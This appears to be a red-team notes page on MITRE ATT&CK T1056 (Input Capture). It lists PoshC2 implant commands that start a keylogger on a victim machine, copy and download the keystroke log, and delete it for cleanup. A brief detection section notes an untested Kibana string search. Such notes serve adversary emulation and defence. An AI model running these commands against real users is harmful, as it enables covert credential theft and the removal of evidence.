# [Input Capture](https://attack.mitre.org/techniques/T1056/)

## Exploit Description: 
Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).

---

## Exploit syntax:
In Poshc2, Run
```sh
start-keystrokes 
##Starts the Keylogger(realtime on poshc2 Server)

start-keystrokes-writefile 
##record this filelocation(.log) this in on victim box

### Keylogger is now running until Stopped ### Typically used if keylogger is being ran over a set time"


copy "fileLocation(.log)" "Sameplace newname(.log)"
#make a copy to download after the logger has been running
## you cant download the original filelocation if the implant is still up. will get file in use error

Download-file "path of newname.log" 
## Gets put into /var/poshc2/*projectname*/downloads

Stop-Keystrokes 
##Stop keylogger for cleanup

posh-delete "path of newname.log"
##Cleaning up file created

##you cant delete the original filelocation if the implant is still up. will get file in use error.
```
---

## Detection Technique:
* (Kibana): Utilized string searches. (“Get-Keystrokes”) --- NOT TESTED IN KIBANA
* Detection has not been found